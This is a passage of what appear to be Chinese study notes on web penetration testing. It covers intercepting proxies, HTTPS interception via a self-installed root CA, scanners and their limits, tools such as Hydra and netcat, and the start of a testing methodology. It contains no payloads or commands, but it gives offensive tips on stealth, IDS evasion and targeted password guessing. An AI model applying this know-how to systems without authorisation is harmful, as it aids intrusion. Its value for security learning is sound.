<li>IEWatch：功能与 HttpWatch 类似，另外还可用于分析 HTTP 文档、图像和脚本等；</li>
</ul>
<h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>由于每个浏览器的特性不同，因此针对 IE 无效的 XSS 攻击，可能在 Firefox 有效。以下是常见的攻击辅助扩展：</p>
<ul>
<li>HttpWatch：同样可用于 Firefox</li>
<li>FoxyProxy：设置浏览器的代理，可快速切换代理，并为不同的 URL 设置不同的代理；</li>
<li>LiveHTTPHeader：修改消息头；</li>
<li>PrefBar：启用禁用 cookie、检查访问控制、切换代理、清除缓存；</li>
<li>Wappalyzer：确定页面技术栈；</li>
<li>WebDeveloper 工具栏：查看所有页面链接、更改页面 HTML、取消表单长度限制、显示隐藏的表单字段、修改请求方法；</li>
</ul>
<h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><ul>
<li>XSS Rays：XSS 漏洞和 DOM 漏洞测试；</li>
<li>cookie 编辑器</li>
<li>Wappalyzer</li>
<li>WebDeveloper</li>
</ul>
<h2 id="测试集成工具"><a href="#测试集成工具" class="headerlink" title="测试集成工具"></a>测试集成工具</h2><p>早期的工具是 Achilles，虽然功能简单，但有经验的攻击者可用它实现攻击。当前各常用工具如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084142.png"></p>
<blockquote>
<p>每种套件的侧重点有所不同，建议多尝试几种，再从中选择一两个合适的；</p>
</blockquote>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>各个套件的原理大同小异，它内部一般由多个功能模块组成，不同的模块共享相同的请求和响应数据；它会拦截监控浏览器的请求和响应，并保存与应用程序相关的信息，并配套各种不同的功能对这些信息进行读取或修改；其核心组件一般包括：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084727.png"></p>
<h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>代理拦截是各集成测试软件的核心功能。为了实现拦截，需要先配置浏览器中的代理服务器选项，让浏览器与指定的本地端口发生通信；之后浏览器所有的请求都会发往该端口（实质上该端口即是操作系统为套件分配的端口，当浏览器向该端口发送请求时，请求的数据将由操作系统转发给套件进程进行处理，之后套件转发请求到因特网，并在收到应用程序的响应后，再根据需要转发给浏览器）；</p>
<h5 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h5><p>大多数浏览器都有使用代理服务的选项，只要按照文档，简单的设置一下就搞定了。</p>
<blockquote>
<p>有些应用程序使用厚客户端，并不在浏览器中运行，而是由客户端直接访问硬编码的域名，因此常规的浏览器代理设置行不通。针对这种情况，有一个简单的解决办法是修改操作系统的 hosts 文件，它在操作系统层面，将指定域名解析到指定的 IP 地址；</p>
<p>虽然修改 hosts 可以解析域名问题，但是端口指定不了，因此接下来还需要配置攻击套件监听 80 和 443 端口，并让端口支持匿名代理功能（开启匿名代理后，发往该端口的非代理请求，将强制被重定向）；</p>
<p>为了避免代理 HTTPS 请求遇到 SSL 证书错误的问题，还需要将匿名代理服务器配置为特定域名的 SSL 证书；</p>
<p>配置套件选项，让其将特定主机名解析为其原始的 IP 地址，以覆盖本地主机的 DNS 解析，使其转发出的请求能够被发送正确的目标服务器（不然会被主机的 hosts 设置再转发回给自己）；</p>
<p>攻击套件需要用到请求中的 Host 字段，来实现转发功能。如果请求中没有 Host 字段，就需要手工预设了。如果应用程序只一个目标主机名还好说，如果有多个，就有点蛋疼了。此时需要在多个机器上运行多个套件实例，来模拟不同的远程主机名；每个实例负责转发一个特定的主机名；</p>
</blockquote>
<h5 id="拦截代理服务器与-HTTPS"><a href="#拦截代理服务器与-HTTPS" class="headerlink" title="拦截代理服务器与 HTTPS"></a>拦截代理服务器与 HTTPS</h5><blockquote>
<p> 当开启浏览器中的代理选项后，浏览器发出的请求跟普通请求略有不同，据说是代理格式的请求，之后需要由拦截器转换成非代理的请求，再发送给目标服务器；好奇代理格式的请求的不同点在哪些</p>
</blockquote>
<p>对于 HTTPS 连接，普通的代理服务器将通过建立和保持 connect 连接，来扮演请求中继的功能，浏览器将直接和目标服务器建立 SSL 握手，这意味着代理服务器并无法知道通过 HTTPS 加密传输的内容。因此，拦截服务器并不能以中继的模式工作，不然无法起到拦截的作用。而是要扮演中间商的作用，分别与浏览器和目标服务器建立两个独立的 SSL 握手，浏览器与目标服务器之间则不发生直接的接触；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210507072807.png"></p>
<p>当通过浏览器向目标域名发起请求，收到的却是拦截器提供的 SSL 证书时，浏览器会出现警告弹窗，询问用户是否信任该证书，由于攻击者即是用户本人，因此攻击者可以完全控制浏览器并点击接受。</p>
<p>但接下来会遇到一个问题，目标服务器返回的响应内容中，很有可能携带指向第三方域名的链接，例如引用图片、视频等，而这些第三方域名很可能也是使用 HTTPS 进行访问的；当浏览器向这些第三方域名发起请求时，收到的却是拦截器提供的证书，此时浏览器很可能不再会出现弹窗，询问用户是否接受，而是直接丢弃该请求，并显示一条警告。</p>
<p>另外，当不使用浏览器，而是使用厚客户端向目标服务器发起请求时，厚客户端也很有可能不会相信拦截器的 SSL 证书。</p>
<p>要解决以上问题，关键是要回到问题的原点，即了解一个证书能否被信任，它的过程是怎样发生的。事实上，出于安全和实用的考虑，每个操作系统在出厂的时候，都预安装了一些第三方 CA 机构的根证书。之后各种 SSL 的校验，其实都是通过证书链，最终推导到这些根证书来进行验证的。因此，只要在操作系统中，将自己生成的证书，添加成可信用的 CA 机构，那么由该证书签名的其他证书，就会变成可信的了；</p>
<h5 id="共同特性"><a href="#共同特性" class="headerlink" title="共同特性"></a>共同特性</h5><p>围绕拦截这个基本功能，集成工具一般还配备了高效的辅助工具包，包括：</p>
<ul>
<li>详细的拦截规则：通过设置规则，只拦截满足规则的请求或响应，提高测试效率；</li>
<li>完整的请求和响应记录：可根据需要，将记录转发给其他模块进一步分析处理；并可检索过滤满足特定条件的记录，快速定位；</li>
<li>对请求和响应进行自动匹配和替换：例如自动修改某个参数，修改 cookie 值，删除缓存、修改消息头等；</li>
<li>修改 HTTP 消息格式：例如切换不同的内容编码；</li>
<li>修改 HTML：如显示隐藏表单字段、删除输入限制、删除 JS 检查；</li>
</ul>
<h4 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h4><p>相对于静态页面爬虫，Web 应用程序的爬虫要复杂一点，因为它要处理很多动态生成的东西，并且功能之间经常有顺序要求。使用爬虫的目的在于获取所有关于目标应用程序的功能和内容，以便为下一步的分析做好准备。配合手工浏览，爬虫可以协助发现更多的内容，并将内容获取过程自动化，提高效率，实现彻底搜索；</p>
<p>常用功能如下：</p>
<ul>
<li>自动构建网站地图；</li>
<li>精准爬取指定内容：通过设置规则，准确抓取某一部分指定的内容；避免抓取一些无关的内容，或者访问一些敏感功能，导致出现不可逆的破坏，或者会话终止；</li>
<li>自动解析内容：如 HTML 表单、脚本、注释、图像等，之后可在站点地图中便捷的分析它们；</li>
<li>解析 JS 代码，从中发现动态的 URL 和资源；</li>
<li>根据预设置参数，自动提交表单；</li>
<li>自定义无效资源的规则，让网站地图的构建更加精准（因为有些服务器即使请求的资源无效，也会返回  200 状态）；</li>
<li>通过检查 robots 文件来发现隐藏的资源；</li>
<li>根据枚举的目录，自动抓取里面的内容（即使这些内容链接并没有出现在响应中）；</li>
<li>自动获取和使用 cookie；</li>
<li>自动测试每个页面的 cookie  依赖性；</li>
<li>自动设置正确的 Referer 消息头（因为有些服务端会使用该消息头判断请求是否由人而非机器发起）；</li>
<li>可自定义任意的消息头；</li>
<li>控制自动抓取的速度和顺序，避免请求过快导致服务器崩溃，并让抓取的行为更加隐蔽；</li>
</ul>
<h4 id="测试器"><a href="#测试器" class="headerlink" title="测试器"></a>测试器</h4><p>自动化工具可以提高测试的效率，集成工具通常包含如下常用的功能：</p>
<ul>
<li>常见漏洞扫描的自定义配置；</li>
<li>内置攻击荷载和自定义函数，可根据自定义选项，自动生成任意的有效荷载；</li>
<li>保存扫描数据，可用于生成报告，也可传递给其他模块使用；</li>
<li>可自定义响应查看条件，例如根据表达式，筛选出满足条件的响应；</li>
<li>从响应中提取有用的数据，例如提取用户名和密码，供后续其他攻击使用；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508083154.png"></p>
<h4 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h4><p>扫描器一般包含两类扫描功能：</p>
<ul>
<li>被动扫描：监控浏览器的请求和响应内容，分析是否存在常见的漏洞，如明文密码、cookie 配置错误、跨域 Referer 泄露等；</li>
<li>主动扫描：向目标程序发起攻击荷载，探查潜在漏洞，例如跨站点脚本漏洞、HTTP 消息头注入、文件遍历漏洞等；此类扫描对应用程序有一定的破坏性，可能引起应用程序故障；</li>
</ul>
<p>扫描器的使用方法：</p>
<ul>
<li>在手动解析应用程序的内容后，从生成的站点地图中选择感兴趣的部分，然后用扫描器对其进行扫描，这样可以提高效率，了解关键区域存在漏洞的可能性；</li>
<li>当手动测试单个请求时，可以配合扫描器一起使用。通过扫描器检查该请求是否存在常见漏洞；</li>
<li>在通过爬虫抓取整个程序后，使用扫描器扫描所有内容，类似独立的 Web 扫描器；</li>
<li>在浏览目标程序时，可以 Burp Suite 中开启实时扫描功能。这样借助浏览动作，将需要扫描的请求，实时的发给扫描器，而不必再额外手动进行配置；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508085054.png"></p>
<blockquote>
<p>虽然集成工具的扫描器的设计用途与独立扫描器不同，但事实上它的核心功能很强大，能够完成更多事情；</p>
</blockquote>
<h4 id="手动请求工具"><a href="#手动请求工具" class="headerlink" title="手动请求工具"></a>手动请求工具</h4><p>当需要对某个资源或接口进行深入探查时，我们一般会切换到手动的模式，此时需要对同一个资源或接口重复发布请求，但每个请求之间的内容有所区别。此时就会需要用到手动请求工具，来提高效率</p>
<blockquote>
<p>这方面也有一些独立的工具，例如 Netcat，但一般集成套件也会有集成；集成后更加方便，当使用其模块进行初步探查中，再从中挑选感兴趣的部分，进一步进行深入的探查；探查的过程中，还可以利用其他模块共享的一些功能，例如 HTML 呈现、下游代理、验证、自定义消息头等；</p>
</blockquote>
<p>手动请求的常用功能：</p>
<ul>
<li>与其他模块配合，相互传递请求和数据；</li>
<li>保存所有请求和响应的历史记录，方便进入深入分析；</li>
<li>支持选项卡展示，可一次性处理多个不同的请求；</li>
<li>自动跟踪重定向；</li>
</ul>
<h4 id="会话令牌分析器"><a href="#会话令牌分析器" class="headerlink" title="会话令牌分析器"></a>会话令牌分析器</h4><p>会话令牌理想状态下应该是随机生成的，但是有些 Web 应用程序并没有做到这点。会话令牌分析器（Burp 中的 Sequencer）会基于样本对随机程度进行判断；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509082954.png"></p>
<h4 id="共享功能与实用工具"><a href="#共享功能与实用工具" class="headerlink" title="共享功能与实用工具"></a>共享功能与实用工具</h4><ul>
<li>自动解析 HTTP 消息结构，例如消息头、请求参数等；</li>
<li>自动解析各种序列化的数据；</li>
<li>自动渲染 HTML 内容，就像在浏览器中查看一样；</li>
<li>支持以文本和十六进制格式编辑和显示消息；</li>
<li>支持对请求和响应内容的搜索；</li>
<li>编辑请求后，自动更新 Content-Length 属性；</li>
<li>内置编码器和解码器，可对请求和响应中的内容进行自动化解码或编码；</li>
<li>自动比对两个响应之间的不同之处，并突出显示；</li>
<li>自动化分析和发现易攻击面；</li>
<li>支持持久化保存会话数据；</li>
<li>支持下游代理和 SOCKS 代理；</li>
<li>内置 HTTP 验证方法；</li>
<li>支持客户端的 SSL 证书；</li>
<li>支持更深入的处理 HTTP 属性，例如 gzip 内容编码、块传输编码、状态码等；</li>
<li>支持使用第三方的插件对内置功能进行扩展；</li>
<li>常规任务自动化，例如自动爬取、扫描等；</li>
<li>支持持久化保存选项配置；</li>
<li>平台独立性；</li>
</ul>
<h3 id="测试工作流程"><a href="#测试工作流程" class="headerlink" title="测试工作流程"></a>测试工作流程</h3><p>典型的测试工作流程如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509084554.png"></p>
<p> 基本思路：</p>
<ul>
<li>先解析应用程序的所有功能和请求，形成访问的历史记录和站点地图；</li>
<li>从历史记录或站点地图中，挑选最有可能存在漏洞的功能，发送给特定的模块，进行测试；例如将输入功能发给模糊测试、将令牌发给令牌分析器、使用 Repeater 对某个资源重复发送请求，检查漏洞是否存在等；</li>
<li>找到漏洞后，再回到浏览器检查漏洞是否被触发了，例如跨站点脚本是否注入成功，并会在浏览器触发执行等、SQL 注入成功，浏览器是否显示 SQL 的查询结果等；</li>
</ul>
<blockquote>
<p>测试人员不应该局限于上面的基本思路，可以发挥创意，尝试更多的测试办法，各种模块的组合，甚至还可以引入新的测试工具；</p>
</blockquote>
<h3 id="拦截代理服务器替代工具"><a href="#拦截代理服务器替代工具" class="headerlink" title="拦截代理服务器替代工具"></a>拦截代理服务器替代工具</h3><p>使用拦截代理服务器会导致浏览器和目标应用程序之间的通信被中断，有时候这种中断会导致部分应用程序的功能不可用，导致测试无法进行。此时只能去掉代理服务器，直接使用浏览器跟服务器进行通信，但是通过安装浏览器扩展，我们仍然能够完全控制浏览器发出的任意请求。</p>
<blockquote>
<p>虽然扩展可以控制任意的请求，但是它的缺点是只能手动操作，可能也缺少自动抓取、模糊测试、漏洞扫描等功能；当然，如果可以的话，自己编写浏览器扩展是可以解决以上问题；</p>
</blockquote>
<p>常用的浏览器扩展示例如下，测试员应该多多搜索和试用，并挑选最合适的工具：</p>
<h4 id="Tamper-Data"><a href="#Tamper-Data" class="headerlink" title="Tamper Data"></a>Tamper Data</h4><p>Firefox 扩展，当浏览器尝试提交表单时，它会进行拦截，并跳出弹窗，显示发送的报头和参数，可根据需要进行修改；</p>
<h4 id="TamperIE"><a href="#TamperIE" class="headerlink" title="TamperIE"></a>TamperIE</h4><p>Tamper Data 的 IE 版本，功能相同；</p>
<h2 id="独立漏洞扫描器"><a href="#独立漏洞扫描器" class="headerlink" title="独立漏洞扫描器"></a>独立漏洞扫描器</h2><p>独立漏洞扫描器的好处在于可以快速发现应用程序是否存在常用的漏洞。在收集完应用程序的功能和站点地图后，扫描就会针对各个功能发起各种攻击请求，并自动分析响应内容，从中查找漏洞存在的关键特征，之后生成一份漏洞报告。</p>
<h3 id="扫描器探测到的漏洞"><a href="#扫描器探测到的漏洞" class="headerlink" title="扫描器探测到的漏洞"></a>扫描器探测到的漏洞</h3><p>有些漏洞有非常明显的特征，通过扫描器可以非常可靠的探测到。有时候，在应用程序的请求和响应中，自带这些特征。当发现这些特征后，扫描器就会有针对性的发送一个攻击荷载，看漏洞是否会被触发，如果会的话，扫描器就会将漏洞记录到报告中；</p>
<p>扫描器可以探测到的常见漏洞有：</p>
<ul>
<li>反射型跨站点脚本漏洞：此时用户提交的输入未被检查或净化，可直接在响应中返回；</li>
<li>SQL 注入漏洞：提交单引号会导致响应返回 ODBC 错误；或者提交特定字符串，会导致响应的时间延迟；</li>
<li>路径遍历漏洞：提交对某个已知文件的请求，然后看响应中是否出现该文件内容；</li>
<li>命令注入漏洞：提交注入导致响应延迟，或者某个特殊内容可以在响应中出现；</li>
<li>目录列表：提交目录请求，从响应中查看是否有目录列表；</li>
<li>明文密码、cookie、开启自动完成表单：直接通过检查请求和响应内容即可初步判断；</li>
<li>信息泄露：提交不同文件扩展名的枚举资源请求，检查是否存在未在链接中公开的文件和数据；</li>
</ul>
<p>不过漏洞扫描器也不是万能的，它也存在很多的局限性，只要开发者对稍加注意，扫描器经常就无法在响应中发现漏洞特征，以下是一些扫描器难以准确判断的漏洞：</p>
<ul>
<li>访问控制漏洞：此类漏洞可导致 A 用户访问 B 用户的数据，甚至是管理员的功能；</li>
<li>参数修改：扫描器无法预知修改某个参数，在逻辑上可能给应用程序带来的影响；</li>
<li>逻辑错误：例如提交负值，破坏计算逻辑；或者省略请求，跳过应用程序的检查步骤；</li>
<li>设计漏洞：例如低安全的密码，可通过枚举猜测；</li>
<li>会话劫持：攻击者通过猜测的会话令牌，假装另外一名用户登录；</li>
<li>敏感信息泄露：用户名列表、日志等；</li>
</ul>
<blockquote>
<p>虽然扫描器很有用，但是不能仅仅依赖它，因为有些漏洞它难以探查出来。在扫描器的基础上，应该多进一步分析；</p>
</blockquote>
<h3 id="扫描器限制"><a href="#扫描器限制" class="headerlink" title="扫描器限制"></a>扫描器限制</h3><p>虽然扫描器是专门研究 Web 应用程序漏洞的专家的所设计，但它仍然不可避免存在一些目前技术难以克服的先天限制，主要原因如下：</p>
<ul>
<li>Web 应用程序不是一种标准的程序，每个 Web 应用程序要解决的问题各不相同，因此写出来的代码千差万别，这也决定了其包含的漏洞形式和位置千差万别；相同的错误代码，却可能包含不同的错误消息，代表不同的含义。扫描器目前还无法像人类一样理解这些消息背后的真正含义，并做出下一步合理的行动。</li>
<li>针对某个应用程序的特殊异常表现，扫描器无法针对该异常做出有创造性的处理，它只能使用写好的既定步骤，完成标准的行为。扫描器只能按既定规则，蛮力提交大量请求。它无法从一堆响应中，找出最佳的攻击办法，例如根据多阶段步骤设计专门的输入、调整请求的顺序、在不同的步骤中传递消息等；</li>
</ul>
<h3 id="扫描器技术挑战"><a href="#扫描器技术挑战" class="headerlink" title="扫描器技术挑战"></a>扫描器技术挑战</h3><ul>
<li>在扫描器自动化运行的过程中，有可能因为提交了某个请求，导致会话退出，此时有些扫描器无法自动重新登录，可能会导致部分漏洞被错过；</li>
<li>危险性：某些提交给应用程序的请求可能需要极大的破坏性，有可能直接导致应用程序崩溃，或者数据库的数据丢失；</li>
<li>扫描器一般将不同的链接理解为不同的内容，但事实上要测试的是功能，同一个功能，可能包含海量的链接，例如购物网站的商品链接，日历应用的日期链接等；</li>
<li>状态化处理：Web 应用程序的一个趋势是越来越多的保留大量状态在客户端，某个功能的完成，需要基于客户端的状态信息来完成；</li>
<li>避开应用程序的防御措施，例如出现异常立即终止会话、CAPTHA、二次验证等；</li>
</ul>
<h3 id="主流产品"><a href="#主流产品" class="headerlink" title="主流产品"></a>主流产品</h3><p>目前市场上主流的漏洞扫描器产品包括：</p>
<ul>
<li>Acunetix</li>
<li>AppScan</li>
<li>Burp Scanner</li>
<li>Hailstorm</li>
<li>NetSparker</li>
<li>N-Stalker</li>
<li>NTOSpider</li>
<li>Skifish</li>
<li>WebInspect</li>
<li>w3af</li>
</ul>
<p>大部分扫描器是收费的，少数是免费的，有趣的是，价格跟性能之间并没有直接关系。价格更高的不一定代表更好，价格低也不意味着性能不好</p>
<h3 id="扫描器使用"><a href="#扫描器使用" class="headerlink" title="扫描器使用"></a>扫描器使用</h3><p>漏洞扫描器的好处是可以在最少的时间内，发现最多的漏洞，但最多一般也不会超过常见漏洞的 50%；这意味着它主要使用在以下场景中：</p>
<ul>
<li>时间紧迫，需要尽快给出结果；</li>
<li>时间不紧迫，可基于该结果做为后续详细探查的参考；</li>
</ul>
<p> 使用时的注意事项：</p>
<ul>
<li>了解扫描器能够发现的漏洞类型，以及它不能够发现的漏洞类型；（知其为，知其不可为）</li>
<li>熟悉扫描器的功能，知道如何进行配置，能够实现有效的扫描；</li>
<li>在扫描之前，先全面了解应用程序，以便更有针对性的利用扫描器的功能；（知已知彼，百战不殆）</li>
<li>了解抓取功能和全自动探查潜在的危险；</li>
<li>手动核实扫描报告中的所有潜在漏洞；</li>
<li>扫描器会在服务器和 IDS 防御中留下大量的“指纹”，如果要保持隐秘，则不要使用扫描器；</li>
</ul>
<p>除非是对渗透测试不了解的用户，或者需要在短时间内处理大量的应用程序安全评估，不然一般不使用全自动的扫描。更好的做法是手动和自动的结合，通过手动在浏览器中访问目标 Web 应用程序，来指导扫描器的工作，这样好处多多，例如不容易遗漏关键的功能区域、避开危险功能、避开重复功能、处理可能遇到困难的输入确认、避免会话中断、正确处理多阶段的状态等；</p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>除了主流的渗透测试工具外，还有很多其他工具可以处理一些不常见的特殊任务，以下仅包含一些常用的，当遇到其他场景时，应该上网搜索并尝试更多更好的工具。</p>
<h3 id="Wikto-Nikto"><a href="#Wikto-Nikto" class="headerlink" title="Wikto/Nikto"></a>Wikto/Nikto</h3><p>Nikto 主要用来探查服务器上是否存在一些常见的第三方内容，它的工作原理很简单，就是先收集市面上各种普通使用的第三方内容，形成自己的数据库，然后基于该数据库，提出对应的请求，分析响应内容，从中找出关键特征，确认第三方内容是否存在；它的数据库会不断频繁的更新，以跟进最新的动态，因此比集成渗透工具要覆盖的多；</p>
<p>另外根据应用程序的自定义义行为，Nikto 允许对其分析功能进行配置，避免一些误警报；</p>
<blockquote>
<p>Wikto 是 Nikto 的 Windows 版本；</p>
</blockquote>
<h3 id="Firebug"><a href="#Firebug" class="headerlink" title="Firebug"></a>Firebug</h3><p>Firebug 是在浏览器中使用的工具，通过它可以任意的修改 HTML 页面上的标签内容和脚本（可能有点像油猴）；它主要用来分析和实现针对客户端的攻击，例如跨站点脚本、请求伪造、UI 伪装、跨域数据捕获攻击等；</p>
<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 是一个密码猜测工具，根据用户提供的用户名列表、URL 链接、线程数量等，它会生成大量的请求，然后根据响应判断密码是否猜测正确；</p>
<h3 id="定制脚本"><a href="#定制脚本" class="headerlink" title="定制脚本"></a>定制脚本</h3><p>一般情况下，使用通用工具，可以完成大多数的渗透测试任务。但在少数情况下，可能需要通过编写定制化的脚本，来解决特定的问题，常用场景如下：</p>
<ul>
<li>应用程序使用会话机制比较特别，例如：提交页面令牌有先后顺序要求；</li>
<li>某个漏洞，需要重复执行多个特定动作后，才会暴露出来；</li>
<li>会话终止后，需要通过非标准步骤重新建立会话；</li>
</ul>
<p>解决以上问题的办法，就是自己编写一段脚本来提示请求和处理响应，以完成特定的功能。有好的是，套件工具可能提供插件接口，可以将脚本集成到测试套件中（例如 Burp 的 Extender、WebScarab 的 Bean Shell）；</p>
<p>除了脚本本身可用的内置命令和第三方库以外，还可以调用操作系统 shell 中的工具，例如：</p>
<ul>
<li>Wget：通过 HTTP(S) 访问某个给定的 URL；它支持很多选项参数，例如：代理服务器、HTTP 验证等；</li>
<li>curl：用于提交 HTTP(S) 请求，同样支持很多选项参数，例如：不同的请求方法、请求参数、SSL 证书、HTTP 验证等；</li>
<li>netcat：主要用来处理与网络有关的任务，同样可以创建 TCP 连接，发送请求并处理响应；更有趣的是，它可以用来在本地创建一个监听器，接收来自其他计算机的连接请求（netcat 不支持 SSL 连接，但可以通过和其他工具配合使用来实现 SSL 连接）；</li>
<li>stunnel：它最核心的功能就是用来辅助建立 SSL 连接，即可以用在 netcat 上，也可以用在自定义脚本上；它的工作原理其实也不复杂，就是扮演代理服务器的作用，先监听某个本地端口，当收到发送到这个端口的请求后，再转成 SSL 转发请求到目标服务器；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512081913.png"></li>
</ul>
<h2 id="小结-12"><a href="#小结-12" class="headerlink" title="小结"></a>小结</h2><p>通过工具，可以极大的提高测试的效率。没有最好的工具，只有最合适的工具。</p>
<h1 id="21-渗透测试方法论"><a href="#21-渗透测试方法论" class="headerlink" title="21. 渗透测试方法论"></a>21. 渗透测试方法论</h1><p>通过抽象的方法论，能够更好的指导实践。渗透测试需要探查的区域可以总结如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512082646.png"></p>
<p>虽然从这张图看上去，各个攻击面之间好像有先后顺序，但其实并没有。完全可以利用在某个阶段发现有用的信息后，再返回上一个阶段重新进行攻击测试；例如通过访问控制漏洞，获得用户列表后，就可以基于该列表实施更加有针对性的密码猜测攻击；</p>
<p>在某个功能中发现的漏洞，对当前功能可能并没有什么危害，但是却可以被利用它进行其他功能的攻击。例如通过文件泄露漏洞获得源代码，然后可以直接进行代码审查，提高漏洞探查的效率；</p>
<p>某个漏洞的探查结果，可以帮助其他环节提高探查效率（因为很可能在程序内部，函数之间存在复用），例如同一个输入过滤程序，很可能使用在不同的功能模块中；当发现某种输入过滤的漏洞后，就有可能极大的提高其他环节的漏洞探查效率，设计有针对性的攻击荷载，直接避开过滤；</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>务必牢记的注意事项：</p>
<h3 id="转义-1"><a href="#转义-1" class="headerlink" title="转义"></a>转义</h3><p>部分字符在 HTTP 请求中，具有特殊的意义，而且出现在不同的位置时，可能意义不同；因为如果在请求中出现这些字符时，需要给它们进行 URL 编码，以确保它们能够被正确的识别和发送；</p>
<ul>
<li>&，用于在查询字符串和消息主体中分隔参数，字面量需要编码为 %26</li>
<li>=，用于在查询字符串和消息主体中连接参数键值对，字面量需要编码为 %3d</li>
<li>?， 用于在查询字符串中标记参数的起始位置，字面量需要编码为 %3f</li>
<li>空格，用于在请求的第一行标记 URL 结束，也用于在 Cookies 消息头中表示一个 cookie 值的结束；字面量需要编码为 %20 或者 +</li>
<li>+，表示空格，字面量需要编码为 %2b</li>
<li>;，用于在 cookie 消息头中分隔多个 cookie 值，字面量需要编码为 %3b</li>
<li>#，用于在 URL 中标记片段名称的起始位置，如果在 URL 中插入这个字符，URL 将被截短为插入位置前面的部分，后面的部分转换成片段标识；字面量需要编码为 %23</li>
<li>%，用于标记 URL 编码的起始位置，字面量需要编码为 %25</li>
<li>空字节，字面量需要编码为 %00</li>
<li>换行符，字面量需要编码为 %0a</li>
</ul>
<h3 id="二次转义"><a href="#二次转义" class="headerlink" title="二次转义"></a>二次转义</h3><p>浏览器通常会对表单中提交的数据进行 URL 编码，因为如果在表单中输入已经编码过的值，则很可能会导致二次编码，最好在拦截代理服务器中查看核定一下最终结果；</p>
<h3 id="假阳性"><a href="#假阳性" class="headerlink" title="假阳性"></a>假阳性</h3><p>有时候良性请求，也会导致响应中出现漏洞特征，导致扫描器误以为存在漏洞。此时需要分别提交良性和攻击两种请求，看响应是否有所区别，以确定漏洞真实存在，而不是误报（假阳性）；</p>
<h3 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h3><p>扫描器通常会对某个接口发送多个请求，导致它出现了多种状态。它下一个请求可能需要在某个特定的状态下，才能继续，因此上一个请求的多种状态，会导致下一个请求无法正常进行。解决办法是可以换个浏览器建立新会话，提交良性请求导致到目标位置，提交攻击请求，然后观察是否出现异常的响应；当然，如果不想另开浏览器，也可以通过修改 cookie 值和缓存信息进行调整；或者，也可以使用 Burp Reapter 工具隔离请求，让每个请求的状态不会相互影响</p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>有些应用程序很可能使用负载均衡，后端可能存在不止一台服务器，因此某个攻击请求造成的影响，可能仅限于某台服务器；当下一个验证请求恰好没有到达该服务器时，可能会误以为攻击没有成功；解决办法是多次提交验证请求，直到请求被转发到目标服务器，验证攻击是否成功；</p>
<h2 id="解析应用程序内容"><a href="#解析应用程序内容" class="headerlink" title="解析应用程序内容"></a>解析应用程序内容</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210513074745.png"></p>
<h3 id="搜索可见的内容"><a href="#搜索可见的内容" class="headerlink" title="搜索可见的内容"></a>搜索可见的内容</h3><ul>
<li>配置浏览器，使用代理服务器或爬虫工具，例如使用 Burp 和 WebScarab 监控并被动抓取代理服务器拦截的内容；</li>
<li>如果需要，除了从代理服务器入手外，也可以从浏览器入手；可以考虑安装浏览器扩展，例如 IEWatch，监控分析浏览器处理的 HTTP 和 HTML 内容；</li>
<li>以常规的方式，浏览整个应用程序，包括发现的每一个链接、提交每一个表单、完成多阶段功能；同时尝试在禁用 javascript 或 cookie 的状态下进行浏览；原因：针对不同内容和不同的浏览器设置，应用程序内部可能有相应的处理逻辑；</li>
<li>如果可以创建或者拥有登录账户，则访问所有被保护的功能；</li>
<li>在浏览过程中，留意客户端的代码如何对服务端返回的内容进行处理；</li>
<li>查看自动生成的站点地图，看是否包含未被手动浏览访问的链接或功能；例如可以使用 Burp Spider 中的 Linked From 功能，了解每项内容是从何处链接过来的；然后访问这些来源链接，向上追溯，以期找到更多的内容；反复递归使用这个方法，直到无法发现任何新内容；</li>
<li>手动浏览结束后，可进一步选择部分 URL 做为起点，使用爬虫进行自动抓取。这种方法有时会找到一些漏网之鱼；不过在进行自动抓取前，需要先创建可引起会话中断的链接列表，配置爬虫，避开这些链接；</li>
</ul>
<h3 id="浏览公开内容"><a href="#浏览公开内容" class="headerlink" title="浏览公开内容"></a>浏览公开内容</h3><ul>
<li>网站的公开内容很可能会被搜索引擎的爬虫抓取过，因此，可以使用搜索引擎和档案库（如 Waybak Machine）来查找与目标应用程序相关的内容；</li>
<li>注意使用搜索引擎的参数来提高搜索效率，例如在 google 中：<ul>
<li>site，用来指定搜索的目标站点；</li>
<li>link，获取链接到目标站点的其他站点；</li>
</ul>
</li>
<li>在搜索引擎中发现的内容有时可能已被目标程序删除，但通过查看页面缓存，有时可以在里面发现一些有效的资源链接；</li>
<li>搜索在应用程序的内容中出现的任何姓名和电邮地址；这些内容有时候可能不在屏幕上显示，而是隐藏在注释中；</li>
<li>除了 Web 搜索外，还应进行新闻和小组讨论搜索， 因为有时候新闻内容可能包括与应用程序有关的技术信息；</li>
<li>检查任何已发布的接口文档，以了解应用程序可能采用的功能名称和参数说明；</li>
</ul>
<h3 id="发现隐藏的内容-1"><a href="#发现隐藏的内容-1" class="headerlink" title="发现隐藏的内容"></a>发现隐藏的内容</h3><ul>
